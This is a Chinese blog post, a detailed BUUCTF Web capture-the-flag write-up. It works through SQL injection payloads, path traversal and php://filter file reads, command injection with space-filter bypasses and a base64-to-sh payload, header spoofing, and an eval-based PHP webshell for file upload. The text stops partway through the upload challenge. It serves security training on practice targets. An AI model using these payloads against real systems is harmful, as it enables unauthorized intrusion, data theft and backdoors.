<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【BUUCTF Web】WriteUp超详细 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【BUUCTF Web】WriteUp超详细" />
<meta property="og:description" content="BUUCTF Web [极客大挑战 2019]EasySQL[极客大挑战 2019]Havefun[HCTF 2018]WarmUp[ACTF2020 新生赛]Include[ACTF2020 新生赛]Exec[GXYCTF2019]Ping Ping Ping[强网杯 2019]随便注[SUCTF 2019]EasySQL[极客大挑战 2019]Secret File[极客大挑战 2019]LoveSQL[极客大挑战 2019]Http[极客大挑战 2019]Knife[极客大挑战 2019]Upload[ACTF2020 新生赛]Upload[极客大挑战 2019]BabySQL[极客大挑战 2019]PHP[ACTF2020 新生赛]BackupFile[RoarCTF 2019]Easy Calc[极客大挑战 2019]BuyFlag[BJDCTF2020]Easy MD5[护网杯 2018]easy_tornado [极客大挑战 2019]EasySQL 首先第一步 判断是哪一种注入方式：字符型？还是数字型？
在请求框中输入 1 1&#39; 来根据服务器给出的回显进行判断 输入1时
输入1’ 时
根据回显内容可知，该注入类型为字符型注入 接下来因为是字符型注入，可以尝试字符型注入时的万能公式试一试
这里我个人认为区分字符型和数字型的最简单的方式就是看他1后面有没有跟着单引号，如果有就是字符型，如果没有就是数字型
万能公式： 1 and 1=1 数字型 1&#39; and &#39;1&#39;=&#39;1 字符型 1 or 1=1 数字型 1&#39; or &#39;1&#39;=&#39;1 字符型 使用 1’ or 1=1 进行注入时，注入成功
使用 1’ and ‘1’= &#39;1 进行注入，注入不成功" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/581f3d41319a11beeca4cec18e261da8/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-03T09:45:02+08:00" />
<meta property="article:modified_time" content="2023-09-03T09:45:02+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【BUUCTF Web】WriteUp超详细</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>BUUCTF Web</h4> 
 <ul><li><a href="#_2019EasySQL_2" rel="nofollow">[极客大挑战 2019]EasySQL</a></li><li><a href="#_2019Havefun_41" rel="nofollow">[极客大挑战 2019]Havefun</a></li><li><a href="#HCTF_2018WarmUp_63" rel="nofollow">[HCTF 2018]WarmUp</a></li><li><a href="#ACTF2020_Include_167" rel="nofollow">[ACTF2020 新生赛]Include</a></li><li><a href="#ACTF2020_Exec_182" rel="nofollow">[ACTF2020 新生赛]Exec</a></li><li><a href="#GXYCTF2019Ping_Ping_Ping_211" rel="nofollow">[GXYCTF2019]Ping Ping Ping</a></li><li><a href="#_2019_275" rel="nofollow">[强网杯 2019]随便注</a></li><li><a href="#SUCTF_2019EasySQL_336" rel="nofollow">[SUCTF 2019]EasySQL</a></li><li><a href="#_2019Secret_File_392" rel="nofollow">[极客大挑战 2019]Secret File</a></li><li><a href="#_2019LoveSQL_416" rel="nofollow">[极客大挑战 2019]LoveSQL</a></li><li><a href="#_2019Http_458" rel="nofollow">[极客大挑战 2019]Http</a></li><li><a href="#_2019Knife_493" rel="nofollow">[极客大挑战 2019]Knife</a></li><li><a href="#_2019Upload_500" rel="nofollow">[极客大挑战 2019]Upload</a></li><li><a href="#ACTF2020_Upload_558" rel="nofollow">[ACTF2020 新生赛]Upload</a></li><li><a href="#_2019BabySQL_592" rel="nofollow">[极客大挑战 2019]BabySQL</a></li><li><a href="#_2019PHP_629" rel="nofollow">[极客大挑战 2019]PHP</a></li><li><a href="#ACTF2020_BackupFile_693" rel="nofollow">[ACTF2020 新生赛]BackupFile</a></li><li><a href="#RoarCTF_2019Easy_Calc_714" rel="nofollow">[RoarCTF 2019]Easy Calc</a></li><li><a href="#_2019BuyFlag_756" rel="nofollow">[极客大挑战 2019]BuyFlag</a></li><li><a href="#BJDCTF2020Easy_MD5_767" rel="nofollow">[BJDCTF2020]Easy MD5</a></li><li><a href="#_2018easy_tornado_787" rel="nofollow">[护网杯 2018]easy_tornado</a></li></ul> 
</div> 
<p></p> 
<h2><a id="_2019EasySQL_2"></a>[极客大挑战 2019]EasySQL</h2> 
<p><img src="https://images2.imgbox.com/41/0a/7gJmz2dp_o.png" alt="在这里插入图片描述"><br> 首先第一步 判断是哪一种注入方式：字符型？还是数字型？</p> 
<pre><code>在请求框中输入 1  1' 来根据服务器给出的回显进行判断
</code></pre> 
<p>输入1时<br> <img src="https://images2.imgbox.com/e7/03/O4oldqy2_o.png" alt="在这里插入图片描述"><br> 输入1’ 时<br> <img src="https://images2.imgbox.com/00/c3/IKhPKPsA_o.png" alt="在这里插入图片描述"></p> 
<pre><code>根据回显内容可知，该注入类型为字符型注入
</code></pre> 
<p>接下来因为是字符型注入，可以尝试字符型注入时的万能公式试一试<br> 这里我个人认为区分字符型和数字型的最简单的方式就是看他1后面有没有跟着单引号，如果有就是字符型，如果没有就是数字型</p> 
<pre><code>万能公式：
1 and 1=1    数字型
1' and '1'='1   字符型
1 or 1=1    数字型
1' or '1'='1  字符型
</code></pre> 
<p>使用 1’ or 1=1 进行注入时，注入成功<br> <img src="https://images2.imgbox.com/eb/b9/TsW5rtvy_o.png" alt="在这里插入图片描述"><br> 使用 1’ and ‘1’= '1 进行注入，注入不成功<br> <img src="https://images2.imgbox.com/7b/81/OwPIHxLc_o.png" alt="在这里插入图片描述"></p> 
<pre><code>为什么and不行而or就可以呢?
这里就要首先了解and和or的区别。在注入时，A and B 执行成功的条件是A与B必须同时成立，才判断为正确。而 A or B 执行成功的条件是A与B有一项正确即可。可以理解为与或关系，and是与or是或，这样就可以理解为什么and不可以了。
</code></pre> 
<h2><a id="_2019Havefun_41"></a>[极客大挑战 2019]Havefun</h2> 
<p><img src="https://images2.imgbox.com/fa/62/xqmtdMmH_o.png" alt="在这里插入图片描述"><br> 我们可以看见这个页面上只有一只小猫，我们可以尝试查看网页源代码</p> 
<pre><code>可以鼠标右击-&gt;查看网页源代码 
也可以ctrl+U快捷打开网页源代码
</code></pre> 
<p>我们可以看到网页源代码中有这么一块代码<br> <img src="https://images2.imgbox.com/9f/8b/qbJMOkP0_o.png" alt="在这里插入图片描述"><br> 呢么我们尝试在url中请求?cat=dog尝试一下,可以看到flag出现了<br> <img src="https://images2.imgbox.com/6c/4f/JA7XZ6Wy_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="HCTF_2018WarmUp_63"></a>[HCTF 2018]WarmUp</h2> 
<p><img src="https://images2.imgbox.com/32/93/0agoj44O_o.png" alt="在这里插入图片描述"><br> 题目给出提示是php 代码审计，那么我们可以直接查看网页源代码<br> <img src="https://images2.imgbox.com/fe/02/4kncCcJu_o.png" alt="在这里插入图片描述"><br> 可以看到有一个php代码文件 source.php</p> 
<pre><code>我们在url后加上/source.php 对该文件下php代码内容进行访问
</code></pre> 
<p><img src="https://images2.imgbox.com/85/9a/bWjDPkiR_o.png" alt="在这里插入图片描述"><br> 同样审计发现，还有一个php文件叫做hint.php,同样的方法对该文件进行访问<br> <img src="https://images2.imgbox.com/22/9f/cRPXyhPZ_o.png" alt="在这里插入图片描述"><br> hint.php文件告诉我们 flag不在hint.php中，而在一个叫做ffffllllaaaagggg的东西中<br> <img src="https://images2.imgbox.com/95/55/s7eHH4VG_o.png" alt="在这里插入图片描述"><br> 这时候我们返回头来继续查看source.php,理解source.php中的代码</p> 
<pre><code>&lt;?php
    highlight_file(__FILE__); // 显示当前文件的源代码

    class emmm
    {
        public static function checkFile(&amp;$page)
        {
            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"]; // 白名单，允许访问的文件

            // 检查$page是否存在且为字符串
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it"; // 输出错误信息
                return false; // 返回false，表示文件验证失败
            }

            // 检查$page是否在白名单中
            if (in_array($page, $whitelist)) {
                return true; // 返回true，表示文件验证通过
            }

            // 对$page进行处理，去除可能存在的查询字符串
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );

            // 检查处理后的$_page是否在白名单中
            if (in_array($_page, $whitelist)) {
                return true; // 返回true，表示文件验证通过
            }

            // 对$page进行URL解码，并进行与上面相同的处理
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );

            // 检查处理后的$_page是否在白名单中
            if (in_array($_page, $whitelist)) {
                return true; // 返回true，表示文件验证通过
            }

            echo "you can't see it"; // 输出错误信息
            return false; // 返回false，表示文件验证失败
        }
    }

    // 检查是否存在非空的$_REQUEST['file']，且为字符串，并调用emmm类的checkFile方法验证文件
    if (! empty($_REQUEST['file'])
        &amp;&amp; is_string($_REQUEST['file'])
        &amp;&amp; emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file']; // 包含指定的文件
        exit; // 终止脚本执行
    } else {
        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; // 输出一张图片
    }  
?&gt;

</code></pre> 
<p>通过查看代码，我们对url进行修改,键入</p> 
<pre><code>source.php?file=hint.php?ffffllllaaaagggg
</code></pre> 
<p><img src="https://images2.imgbox.com/be/3f/KxZa6kg8_o.png" alt="在这里插入图片描述"><br> 这时候我们发现图片消失了，说明我们键入的内容是满足条件的，<br> 但是我们不知道ffffllllaaaagggg的具体位置，所以我们采用如下方法进行文件访问</p> 
<pre><code>source.php?file=hint.php?../../../../../ffffllllaaaagggg
</code></pre> 
<p>flag出现<br> <img src="https://images2.imgbox.com/57/8e/kgpb5i03_o.png" alt="在这里插入图片描述"></p> 
<pre><code>../   路径穿越（目录遍历）攻击
../ 是一种相对路径标识符，用于表示返回到上一级目录。这种技术被称为路径穿越（Path Traversal）或目录遍历攻击（Directory Traversal Attack）。攻击者可以利用目录遍历漏洞来绕过应用程序的访问控制机制，访问其本来不应该访问的文件或目录。通过连续使用 ../ 返回多次，攻击者可以逐级向上导航到更高级别的目录，直到达到目标文件或目录。
</code></pre> 
<h2><a id="ACTF2020_Include_167"></a>[ACTF2020 新生赛]Include</h2> 
<p>首先打开发现有一个链接是tips<br> <img src="https://images2.imgbox.com/c1/42/sXlbePi1_o.png" alt="在这里插入图片描述"><br> 打开后是名为flag.php的文件，我们要想办法获取到文件的源码。<br> 涉及到PHP伪协议，可以参考<a href="https://blog.csdn.net/qq_62604985/article/details/131641496">PHP伪协议</a></p> 
<p>在了解了php伪协议后，我们判断此处应该使用php://filter读取文件内容</p> 
<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre> 
<p><img src="https://images2.imgbox.com/ac/f2/4sbbmRGg_o.png" alt="在这里插入图片描述"><br> 对获取到的内容进行base64解密即可获得flag<br> base64解密网址：<a href="https://base64.us/" rel="nofollow">base64解码</a><br> <img src="https://images2.imgbox.com/06/db/BDiYOWhf_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="ACTF2020_Exec_182"></a>[ACTF2020 新生赛]Exec</h2> 
<p><img src="https://images2.imgbox.com/ec/db/n1M3h4bY_o.png" alt="在这里插入图片描述"><br> 查看网页源代码，发现提示为命令执行漏洞（command execution）<br> <img src="https://images2.imgbox.com/d9/8e/0BG3PK99_o.png" alt="在这里插入图片描述"><br> 尝试查看post请求中是否存在命令执行漏洞</p> 
<pre><code>尝试写入payload  127.0.0.1| ls
</code></pre> 
<p><img src="https://images2.imgbox.com/a6/c0/ybbm0f4k_o.png" alt="在这里插入图片描述"><br> 发现存在命令执行漏洞，有一个index.php文件,使用之前说过的 路径穿越（目录遍历）攻击 尝试依次查看index.php文件的上层目录，看看目录中是否会有flag</p> 
<pre><code>方法： 127.0.0.1 | ls ../ 
       127.0.0.1 | ls ../../
       127.0.0.1 | ls ../../../
</code></pre> 
<p><img src="https://images2.imgbox.com/42/36/wwQT7FJe_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/81/c2/xxQBK66d_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/2b/f0/7SfbdCo2_o.png" alt="在这里插入图片描述"><br> 在进行第三次时，发现一个名字叫做flag的文件，我们要的flag可能就在这个文件中，对flag文件的内容进行查看</p> 
<pre><code>127.0.0.1 | cat ../../../flag
</code></pre> 
<p><img src="https://images2.imgbox.com/dd/74/1S39ecoV_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="GXYCTF2019Ping_Ping_Ping_211"></a>[GXYCTF2019]Ping Ping Ping</h2> 
<p><img src="https://images2.imgbox.com/a8/b8/P90KDj23_o.png" alt="在这里插入图片描述"><br> 打开靶机我们发现页面只用一个 /?ip= 其余没有任何提示，我们猜测是在url中进行提交</p> 
<pre><code>尝试在url中衔接上/?ip=127.0.0.1
</code></pre> 
<p><img src="https://images2.imgbox.com/a7/f1/azDWFtGz_o.png" alt="在这里插入图片描述"><br> 发现网页出现回显，我们再查看一下网页的源代码，看看有哪些提示，发现网页源代码也没有任何有用的提示<br> <img src="https://images2.imgbox.com/ed/33/6vpZVXph_o.png" alt="在这里插入图片描述"><br> 联想到上一道题是命令执行漏洞，我们再来尝试一下简单的命令执行漏洞</p> 
<pre><code> 第一次我输入的是：
 /?ip=127.0.0.1| ls  发现页面将空格进行了过滤
 第二次我输入的是：
 /?ip=127.0.0.1|ls  发现页面回显出了一些文件名
</code></pre> 
<p><img src="https://images2.imgbox.com/5c/41/IIMMwbCb_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/4d/33/S65xOTvY_o.png" alt="在这里插入图片描述"><br> 我们看到文件中有一个叫做flag.php，我们猜测flag存在于这个文件中，对其进行查看</p> 
<pre><code>/?ip=127.0.0.1|cat flag.php
</code></pre> 
<p>但是我们之前已经知道了代码对空格进行了过滤，所以毫无疑问的失败了，这时就需要用到空格绕过</p> 
<pre><code>空格绕过解法：（以cat flag.php为例子，绕过cat与flag中间的空格）
{cat,flag.php} 
cat${IFS}flag.php
cat$IFS$9flag.php
cat$IFS$1flag.php
cat&lt;flag.php
%09替换
cat&lt;&gt;flag.php
kg=$'\x20flag.php'&amp;&amp;cat$kg
(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)
或者base64编码
</code></pre> 
<p><img src="https://images2.imgbox.com/ab/a1/Gygf39qC_o.png" alt="在这里插入图片描述"><br> 但是！当我们成功绕过空格后发现flag也被过滤了，那我们就先来查看一下index.php中的内容</p> 
<pre><code>cat$IFS$9index.php
</code></pre> 
<p>发现其实过滤了很多东西<br> <img src="https://images2.imgbox.com/a6/68/GcJKKz1e_o.png" alt="在这里插入图片描述"><br> 我们设置payload，读取一下所有文件的所有内容（我是这样理解的）<br> <strong>因为过滤了很多内容，考虑使用``的形式来绕过正则限制<br> 反引号的作用是将命令的输出当做输入执行</strong></p> 
<pre><code>/?ip=127.0.0.1;cat$IFS$1'ls'    
</code></pre> 
<p>然后查看一下网页源代码便获得了flag<br> <img src="https://images2.imgbox.com/ef/68/f3cJ8EFN_o.png" alt="在这里插入图片描述"><br> 或者采用另一种方法，对含有flag的payload进行b64编码，在用base64 -d解码，最后在通过sh执行，最终执行的就是 cat flag.php</p> 
<pre><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
</code></pre> 
<p>同样查看网页源代码，便可以看到flag<br> <img src="https://images2.imgbox.com/c4/1d/LfxInbFo_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2019_275"></a>[强网杯 2019]随便注</h2> 
<p><img src="https://images2.imgbox.com/44/ea/eY4cZITm_o.png" alt="在这里插入图片描述"><br> 这是一道sql注入题，不要问我怎么知道的，和常规的sql注入题一样，检查有无注入<br> 输入1’时回显报错 发现存在注入，且为字符型注入。<br> <img src="https://images2.imgbox.com/13/c2/SQdXYZDH_o.png" alt="在这里插入图片描述"><br> 接下来获取列数</p> 
<pre><code>1' order by 1#   正常
1' order by 2#   正常
1' order by 3#   报错
</code></pre> 
<p>说明总共有两列<br> <img src="https://images2.imgbox.com/84/3a/4yCiTF5r_o.png" alt="在这里插入图片描述"><br> 尝试最简单的联合查询（union select）查询所有数据库</p> 
<pre><code>-1' union select 1,database()#
</code></pre> 
<p>发现有一些字符被过滤掉了<br> <img src="https://images2.imgbox.com/38/13/nDCJW4Ie_o.png" alt="在这里插入图片描述"><br> 更换思路，考虑堆叠注入查询所有数据库<br> 注意 database 和 databases 的区别</p> 
<pre><code>1;show database;#
1;show databases;#
</code></pre> 
<p><img src="https://images2.imgbox.com/d2/8b/K1CU82ed_o.png" alt="在这里插入图片描述"><br> 查询完数据库后，接下来查询所有表</p> 
<pre><code>1; show tables;#
</code></pre> 
<p><img src="https://images2.imgbox.com/d6/bd/ZNJw62G2_o.png" alt="在这里插入图片描述"><br> 发现有一个奇怪的数字，对它的列进行查看<br> 注意这个符号是 ` 而不是’</p> 
<pre><code>-1';show columns from`1919810931114514`;#
1919810931114514
</code></pre> 
<p><img src="https://images2.imgbox.com/2f/78/zlHlcWsC_o.png" alt="在这里插入图片描述"><br> 发现其中有一列为flag，只要我们能查看它的内容，这道题就可以解出来了，但是 select字段被过滤，所以没有办法直接对它进行查询。<br> 我们可以想到words是默认查询的表，再后台的查询语句类似以下</p> 
<pre><code>select * from words where id =’1‘；
</code></pre> 
<p>根据之前我们的查看我们知道它没有过滤rename和alert关键字，所以我们可以修改表的结构，来达到查询flag列的内容<br> 我们先查看words表下的列的内容</p> 
<pre><code>0’；show columns from words;#
</code></pre> 
<p><img src="https://images2.imgbox.com/c8/23/6pTZKfBp_o.png" alt="在这里插入图片描述"><br> <strong>思路：将words表名改为words1，再将数字表名改为words，这样查询语句就会查询数字表名，我们再将flag字段名改为id字段或者直接添加id字段，就可以达到使用原先代码中的查询语句对flag中的内容进行查询，payload如下</strong></p> 
<pre><code>1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
</code></pre> 
<p>最后使用万能密码，即可得到flag<br> <img src="https://images2.imgbox.com/be/c0/1iaJP0KS_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="SUCTF_2019EasySQL_336"></a>[SUCTF 2019]EasySQL</h2> 
<p><img src="https://images2.imgbox.com/fd/4e/luT4fV8c_o.png" alt="在这里插入图片描述"><br> 同样是一道SQL注入题，同常规一样，检查注入点<br> 输入1时查看回显<br> <img src="https://images2.imgbox.com/eb/15/NYNlmJ2g_o.png" alt="在这里插入图片描述"><br> 不管输入什么非零数字，都是一样的回显，尝试0和字符串时没有回显 说明是整型而不是字符型。<br> 查询列数 发现不行<br> <img src="https://images2.imgbox.com/fb/69/OKfiB5Gt_o.png" alt="在这里插入图片描述">那就使用堆叠注入，尝试查看数据库,发现注入成功</p> 
<pre><code>1;show databases;
</code></pre> 
<p><img src="https://images2.imgbox.com/8c/8b/Gd8AHSgL_o.png" alt="在这里插入图片描述"><br> 再查看表名</p> 
<pre><code>1;show tables;
</code></pre> 
<p><img src="https://images2.imgbox.com/ac/05/l9Cv1Vfu_o.png" alt="在这里插入图片描述"><br> 发现出现了flag，判断flag就在Flag中，尝试对flag进行查询<br> <img src="https://images2.imgbox.com/11/72/AxW8xWIb_o.png" alt="在这里插入图片描述"><br> 这里应该是把Flag过滤掉了，但是看好多网上的大佬写到这一步是要去猜测后端的代码，我实在是知识太薄弱了，不知道为什么要猜测后端代码中存在||这个符号，所以先就按照这种思路来写，之后如果能理解的话我会回来将这个想法写完整</p> 
<pre><code> 在sql语句中 || 表示的是或逻辑
 也就是说： C1||C2 C1和C2只要有一侧是1 就是1 否则就是0
</code></pre> 
<p>接下来就要猜测后端的语句了，大胆猜测逻辑就是这样子的</p> 
<pre><code>内部查询语句中有||操作符，只有我们输入非零数字才会满足||的逻辑为True从而进行回显的条件。
即：select 输入数据 || flag from Flag
</code></pre> 
<p>第一种方法：</p> 
<pre><code>*，1   
相当于构造了select *，1 || flag from Flag，这条语句执行起来相当于select *, 1 from Flag
</code></pre> 
<p><img src="https://images2.imgbox.com/62/ca/WK6Qn55g_o.png" alt="在这里插入图片描述"><br> 另一种方法的思路就是 <strong>将||或的逻辑改成连接符的作用</strong><br> 就要补充一个知识点</p> 
<pre><code>设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用，PIPES_AS_CONCAT令||起到连接符的作用
</code></pre> 
<p>构造payload：</p> 
<pre><code>1;set sql_mode=PIPES_AS_CONCAT;select 1
注：这里的逻辑是先把||转换为连接操作符，注意分号隔断了前面的命令，所以要再次添加select来进行查询，这里把1换成其他非零数字也一样会回显flag
</code></pre> 
<p><img src="https://images2.imgbox.com/3f/0a/j3ltMuNK_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2019Secret_File_392"></a>[极客大挑战 2019]Secret File</h2> 
<p><img src="https://images2.imgbox.com/17/ac/SQbLkiQs_o.png" alt="在这里插入图片描述">首先题目首页没给我们多大信息，我们查看一下源码，发现了一个 ./Archive_room.php<br> <img src="https://images2.imgbox.com/c6/c5/t5OeJ6o6_o.png" alt="在这里插入图片描述">对其进行访问，发现页面有一个SECRET可以点击，但是点开后提示我们回去看一看<br> <img src="https://images2.imgbox.com/5d/a7/WEx9Xo6X_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/3d/9e/N4jo4Eiq_o.png" alt="在这里插入图片描述"><br> 我们查看第一页的源代码，发现还有一个文件叫做./Action.php<br> <img src="https://images2.imgbox.com/bd/c3/lYUi8ChD_o.png" alt="在这里插入图片描述">但是对他进行访问后发现实际到达的却是end.php<br> <img src="https://images2.imgbox.com/99/be/8CyT9ec5_o.png" alt="在这里插入图片描述"><br> 这时我们掏出我们的BP进行一个简单的抓包<br> <img src="https://images2.imgbox.com/f9/4c/glwaozMU_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/ce/ab/J75pmtMD_o.png" alt="在这里插入图片描述">发现了一个叫做secr3t.php的文件，对他进行访问，打开是源代码，告诉我们flag放在了flag.php中<br> <img src="https://images2.imgbox.com/78/ef/TsQ97ADc_o.png" alt="在这里插入图片描述"><br> 那我们就对flag.php进行访问，但是还是不显示，对他的源代码进行查看也没有任何帮助，这里就想到了<a href="https://blog.csdn.net/qq_62604985/article/details/131641496">PHP伪协议</a><br> <img src="https://images2.imgbox.com/c9/94/wTvMf4oQ_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/aa/da/flBUSW97_o.png" alt="在这里插入图片描述"></p> 
<pre><code>secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
</code></pre> 
<p><img src="https://images2.imgbox.com/92/5f/PHW4vTZ0_o.png" alt="在这里插入图片描述"><br> 最后对密文进行base64解码就可以得到结果<br> <img src="https://images2.imgbox.com/d7/43/2XDJvaEW_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2019LoveSQL_416"></a>[极客大挑战 2019]LoveSQL</h2> 
<p><img src="https://images2.imgbox.com/60/a2/AaEWeN0R_o.png" alt="在这里插入图片描述"><br> 很明显是一道sql注入题，首先判断注入是整型还是字符，说明是字符型注入，并且使用的是MariaDB数据库<br> <img src="https://images2.imgbox.com/99/4d/vThcCqob_o.png" alt="在这里插入图片描述"><br> 使用万能密码进行一下测试<br> <img src="https://images2.imgbox.com/35/02/8kTyrdSP_o.png" alt="在这里插入图片描述"><br> 我们发现它给了我们一个password，但是经过尝试他并不是flag,对他进行一下解码发现都不行，似乎好像没有什么用处，那我们先按常规查看一下列数吧</p> 
<pre><code>1' order by 3#
</code></pre> 
<p>总共有三列<br> <img src="https://images2.imgbox.com/84/ea/sBHk6LwS_o.png" alt="在这里插入图片描述"><br> 查询一下表名，总共有俩个表</p> 
<pre><code>1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
</code></pre> 
<p><img src="https://images2.imgbox.com/69/d2/EvbIN3U1_o.png" alt="在这里插入图片描述"><br> 可以看到有一个表叫做geekuser，可能有我们想要的信息</p> 
<pre><code>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='geekuser'#
</code></pre> 
<p><img src="https://images2.imgbox.com/a1/35/Yr0jKPpr_o.png" alt="在这里插入图片描述"><br> 查询id username password的具体内容</p> 
<pre><code>1' union select 1,2,group_concat(id,username,password) from geekuser#
</code></pre> 
<p><img src="https://images2.imgbox.com/d9/16/X2NgnnZ4_o.png" alt="在这里插入图片描述"><br> 发现给了我们账号密码 我们登录一下试一试，还是没有用。<br> <img src="https://images2.imgbox.com/5a/96/ERQOk5MF_o.png" alt="在这里插入图片描述">那我们用同样的方法对另一个表进行查看，也许flag存在另一个表中</p> 
<pre><code> 1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#
 1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#
</code></pre> 
<p><img src="https://images2.imgbox.com/b9/5a/TUVmZsjW_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/af/e9/kZr30QPA_o.png" alt="在这里插入图片描述"><br> 将一长串复制出来方便查看，发现了我们要的flag</p> 
<p><img src="https://images2.imgbox.com/a6/8d/dGecFcI6_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2019Http_458"></a>[极客大挑战 2019]Http</h2> 
<p><img src="https://images2.imgbox.com/f5/80/lDqVY6A7_o.png" alt="在这里插入图片描述"><br> 单从网页上来看没有什么发现，涉及到http，所以继续掏出我们的BP进行抓包<br> <img src="https://images2.imgbox.com/70/49/YJYhOKbH_o.png" alt="在这里插入图片描述"><br> 找到了一个Secret.php，访问一下<img src="https://images2.imgbox.com/0b/98/QTIfKQwW_o.png" alt="在这里插入图片描述"><br> 这时我们需要修改header头，把https://www.Sycsecret.com写进去，复制一个头文件，添加关键的一行</p> 
<pre><code>Referer:https://www.Sycsecret.com
</code></pre> 
<pre><code>GET /Secret.php HTTP/1.1
Host: 9141-f2e36f57-6b2f-4563-8342-a0cfdb3ec455node3.buuoj.cn:29788
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer:https://www.Sycsecret.com
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
</code></pre> 
<p><img src="https://images2.imgbox.com/b5/47/ihjXGE9n_o.png" alt="在这里插入图片描述"><br> 随后提示我们浏览器需要使用Syclover，这时我们修改一下User-Agent的内容，使得服务器以为我们使用的是Syclover进行的访问</p> 
<pre><code>User-Agent:Syclover
</code></pre> 
<p><img src="https://images2.imgbox.com/e4/bc/paQCtgbX_o.png" alt="在这里插入图片描述"><br> 这时它又说我们只能通过本地进行一个访问，那么我们就继续更改http请求文件，flag出现</p> 
<pre><code>X-Forwarded-For:127.0.0.1
</code></pre> 
<h2><a id="_2019Knife_493"></a>[极客大挑战 2019]Knife</h2> 
<p><img src="https://images2.imgbox.com/11/fd/QKrrKSzj_o.png" alt="在这里插入图片描述"><br> 题目提示可以使用菜刀链接后门，使用菜刀进行后门连接<br> <img src="https://images2.imgbox.com/4b/9e/w2QSrWSL_o.png" alt="在这里插入图片描述"><br> 成功访问后进行根目录访问，有一个flag文件，进去后发现flag<br> <img src="https://images2.imgbox.com/e8/15/amWJNhyG_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/84/d2/2sjCl0PX_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2019Upload_500"></a>[极客大挑战 2019]Upload</h2> 
<p><img src="https://images2.imgbox.com/28/96/uH4xudXL_o.png" alt="在这里插入图片描述"></p> 
<pre><code>根据题目可以看出来这是一道文件上传题目，此类题目一般都是利用网页上传口的一些漏洞，上传诸如一句话木马等带有危险性的文件去进入其他人的服务器，再利用类如菜刀蚁剑等设备连接服务器进行操作。
</code></pre> 
<p>首先上传一句话木马</p> 
<pre><code>&lt;?php phpinfo(); @eval($_POST['shell']); ?&gt;
注意这里要将代码写入文件进行上传
</code></pre> 
<p><img src="https://images2.imgbox.com/63/30/muztNcDU_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/a7/22/6hT6XCyu_o.png" alt="在这里插入图片描述"><br> 报错，说明后台可能对非图片格式进行了过滤，我们更改文件格式为.jpg，再次尝试<br> <img src="https://images2.imgbox.com/a5/74/JoWVfdnl_o.png" alt="在这里插入图片描述"><br> 报错信息告诉我们对文件中&lt;?的内容进行了过滤，那我们对文件内容进行一下修改</p> 
